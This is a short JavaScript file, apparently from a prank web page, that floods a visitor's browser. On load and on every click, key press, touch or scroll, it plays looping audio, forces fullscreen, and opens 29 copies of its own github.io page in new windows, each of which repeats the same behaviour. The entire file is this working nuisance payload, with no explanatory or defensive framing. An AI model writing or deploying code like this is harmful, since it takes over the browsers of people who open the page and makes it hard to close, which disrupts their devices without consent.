let body = document.documentElement
function full(){
    body.requestFullscreen()
}
function cactus(){
    var audio = new Audio('out.mp3');
    var audio2 = new Audio('cat.mp3');
    audio.loop=true
    if (audio.paused){
        audio.play()
    }
    if (audio2.paused){
        audio2.play()
    }
    for(let i=1; i<30; i++)
    {
     window.open('http://theshitposter78.github.io/cactus/', '_blank');
    }
    full()
}
cactus()
body.addEventListener("touchstart", cactus)
body.addEventListener("keydown", cactus)
body.addEventListener("scroll", cactus)
body.addEventListener("mousedoown", cactus)
body.addEventListener("DOMMouseScroll", cactus)
body.addEventListener("mousewheel", cactus)
body.addEventListener("click", cactus)
